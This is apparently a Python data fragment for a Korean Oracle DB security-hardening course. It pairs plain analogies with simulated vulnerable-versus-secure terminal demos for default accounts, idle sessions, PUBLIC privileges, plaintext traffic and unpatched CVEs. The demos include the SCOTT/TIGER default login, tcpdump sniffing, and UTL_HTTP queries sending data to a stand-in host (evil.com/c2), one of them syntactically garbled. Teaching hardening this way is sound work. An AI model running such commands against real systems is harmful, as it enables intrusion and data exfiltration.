
# ===== D-01~D-26 보강 DYN =====
DYN.update({
 'D-01': {
   'easy': '새 차를 뽑으면 <b>출고 시 드는 기본 열쇠고리 번호</b>가 전 세계 동일합니다. SCOTT/TIGER 같은 기본 계정·기본 비밀번호도 이와 똑같아서, 매뉴얼만 본 사람이라면 누구나 그 번호로 차를 열 수 있습니다.',
   'attack_label': '공격자가 널리 알려진 기본 계정 비밀번호로 DB에 접속한다',
   'attack_vuln': [
     ['cmt', '# 기본 계정 SCOTT가 열려 있는지 확인'],
     ['prompt', 'attacker$ sqlplus SCOTT/TIGER@10.0.0.5:1521/ORCL'],
     ['', 'account_status = OPEN (잠금 없음)'],
     ['bad', '>> Connected to: Oracle Database 19c'],
     ['bad', '>> 매뉴얼에 있는 기본 비밀번호 그대로 접속 성공'],
   ],
   'outcome_vuln': {'emoji': '🔓', 'title': '공격 성공 — 기본 계정 침입', 'desc': '기본 계정이 잠금 없이 남아 있어 설명서만 보고도 누구나 들어올 수 있습니다.'},
   'attack_secure': [
     ['cmt', '# 동일한 기본 비밀번호로 접속 시도'],
     ['prompt', 'attacker$ sqlplus SCOTT/TIGER@10.0.0.5:1521/ORCL'],
     ['good', '>> ORA-28000: the account is locked'],
     ['warn', '>> 미사용 기본 계정은 LOCK/삭제된 상태'],
   ],
   'outcome_secure': {'emoji': '🛡️', 'title': '공격 차단 — 기본 계정 폐쇄', 'desc': '미사용 기본 계정이 잠기거나 삭제되어 기본 비밀번호가 통하지 않습니다.'},
 },
 'D-08': {
   'easy': '로그인한 채로 <b>자리를 비운 관리자 PC</b>입니다. 화면이 켜져 있고 문서도 열려 있죠. 지나가는 누구나 쿼리를 실행하고 자료를 빼갈 수 있습니다. 15분이면 자동으로 잠기도록 해야 합니다.',
   'attack_label': '공격자가 자리 비운 세션을 탈취해 데이터를 빼간다',
   'attack_vuln': [
     ['cmt', '# 유휴 세션 확인 (IDLE_TIME 무제한)'],
     ['prompt', "attacker$ SELECT sid, last_call_et FROM v$session WHERE username='HR';"],
     ['', 'SID 142 — last_call_et 86400초 (1일 방치)'],
     ['bad', '>> 화면 잠김 없는 세션 탈취'],
     ['bad', '>> SELECT * FROM salary; → 자료 유출'],
   ],
   'outcome_vuln': {'emoji': '🔓', 'title': '공격 성공 — 방치 세션 도용', 'desc': '유휴 세션이 무한 유지되어 자리 비운 사이 데이터가 빠져나갑니다.'},
   'attack_secure': [
     ['cmt', '# 동일한 세션 상태 확인'],
     ['prompt', "attacker$ SELECT sid, last_call_et FROM v$session WHERE username='HR';"],
     ['good', '>> 15분 경과 세션은 자동 종료(IDLE_TIME=15)'],
     ['good', '>> 접속이 끊겨 탈취 불가'],
   ],
   'outcome_secure': {'emoji': '🛡️', 'title': '공격 차단 — 자동 잠금', 'desc': 'IDLE_TIME 15분으로 방치 세션이 자동 종료되어 도용 기회가 사라집니다.'},
 },
 'D-10~12': {
   'easy': '회사 건물 전 직원에게 <b>만능 카드를 일괄 배부</b>해 둔 것입니다. PUBLIC 권한은 "모두에게" 주는 권한이라, 아르바이트생도 서버실을 드나들 수 있죠. 그리고 퇴사자 명단에 있는 <b>유령 사원증</b>(미사용 계정)도 그냥 살아 있습니다.',
   'attack_label': '공격자가 낮은 권한 계정 하나로 PUBLIC 권한을 활용해 파일을 빼낸다',
   'attack_vuln': [
     ['cmt', '# 웹셸로 확보한 저권한 DB 계정에서 시작'],
     ['prompt', "attacker$ SELECT * FROM table(UTL_HTTP.REQUEST('http://evil.com/c2')) FROM PUBLIC 권한;"],
     ['', '미사용 계정 TEST_USER(90일 무접속)도 OPEN 상태'],
     ['bad', '>> UTL_HTTP EXECUTE가 PUBLIC에 부여됨'],
     ['bad', '>> 내부 쿼리 결과를 외부 서버로 전송 — 유출 성공'],
   ],
   'outcome_vuln': {'emoji': '🔓', 'title': '공격 성공 — 만능 카드 악용', 'desc': 'PUBLIC 부여 권한과 유령 계정이 낮은 권한 침입을 대유출로 키웁니다.'},
   'attack_secure': [
     ['cmt', '# 동일한 외부 전송 시도'],
     ['prompt', "attacker$ SELECT UTL_HTTP.REQUEST('http://evil.com/c2') FROM dual;"],
     ['good', '>> ORA-06598: INSUFFICIENT PRIVILEGES ON UTL_HTTP'],
     ['good', '>> PUBLIC 권한 회수 + 유령 계정 LOCK 완료'],
   ],
   'outcome_secure': {'emoji': '🛡️', 'title': '공격 차단 — 최소 권한 원칙', 'desc': '강력 패키지 권한 회수와 미사용 계정 정리로 외부 유출 통로가 막힙니다.'},
 },
 'D-18~19': {
   'easy': '회사 <b>왕래 문서를 봉투 없이</b> 복도에서 그냥 돌리는 것입니다. 평문 통신은 지나가는 누구나 읽을 수 있죠. 게다가 출입문이 <b>임대건물 전 입주자에게 열려</b> 있으면(전 IP 허용) 아무나 왕래를 들춰봅니다.',
   'attack_label': '공격자가 내부망에서 평문 DB 트래픽을 스니핑해 계정과 데이터를 가로챈다',
   'attack_vuln': [
     ['cmt', '# 내부망에서 DB 포트 패킷 캡처'],
     ['prompt', 'attacker$ tcpdump -i eth0 port 1521 -w db.pcap'],
     ['', 'TCP.VALIDNODE_CHECKING 없음 — 전 IP 접속 허용'],
     ['bad', '>> 평문 TNS 트래픽 캡처 성공'],
     ['bad', '>> HR/P@ssw0rd, SELECT 결과 그대로 노출 — 계정 탈취'],
   ],
   'outcome_vuln': {'emoji': '🔓', 'title': '공격 성공 — 통신 도청', 'desc': '평문 통신과 무분별한 접근 허용으로 계정·데이터가 중간에 가로채입니다.'},
   'attack_secure': [
     ['cmt', '# 동일한 패킷 캡처 시도'],
     ['prompt', 'attacker$ tcpdump -i eth0 port 1521 -w db.pcap'],
     ['good', '>> 허용 노드 외 접속은 리스너에서 거부'],
     ['good', '>> 캡처된 트래픽은 AES256 암호문 — 해독 불가'],
   ],
   'outcome_secure': {'emoji': '🛡️', 'title': '공격 차단 — 봉인 우편', 'desc': '허용 호스트 제한과 네이티브 암호화로 통신이 잠기고 도청이 무의미해집니다.'},
 },
 'D-25~26': {
   'easy': '<b>CCTV 없는 매장에 리콜 안 받은 낡은 금고</b>를 둔 상황입니다. 도둑이 드는데 녹화가 없으면 누가 언제 왔는지 알 수 없고(CCTV=감사 로그), 금고 제조사가 배포한 보강 부품을 안 끼우면 알려진 비밀번호로 열립니다(리콜=보안 패치).',
   'attack_label': '공격자가 알려진 미패치 취약점으로 침입하고 흔적을 남기지 않는다',
   'attack_vuln': [
     ['cmt', '# 2년 전 공개된 DB 취약점(CVE) 악용'],
     ['prompt', 'attacker$ ./db-exploit --target 10.0.0.5 --cve 2024-XXXX'],
     ['', 'audit_trail = NONE — 모든 작업 미기록'],
     ['bad', '>> 패치 미적용 취약점으로 침입 성공'],
     ['bad', '>> 감사 로그 없음 — 침입 사실 자체를 추적 불가'],
   ],
   'outcome_vuln': {'emoji': '🔓', 'title': '공격 성공 — 흔적 없는 침입', 'desc': '미패치 취약점이 문을 열어주고 감사 부재가 흔적을 지워줍니다.'},
   'attack_secure': [
     ['cmt', '# 동일한 익스플로잇 시도'],
     ['prompt', 'attacker$ ./db-exploit --target 10.0.0.5 --cve 2024-XXXX'],
     ['good', '>> 최신 RU 적용으로 취약점 이미 패치됨'],
     ['good', '>> 시도조차 AUDIT 로그에 기록·원격 보관됨'],
   ],
   'outcome_secure': {'emoji': '🛡️', 'title': '공격 차단 — 기록·보강 완료', 'desc': '정기 패치로 알려진 구멍이 막히고 감사 로그로 모든 시도가 남습니다.'},
 },
})
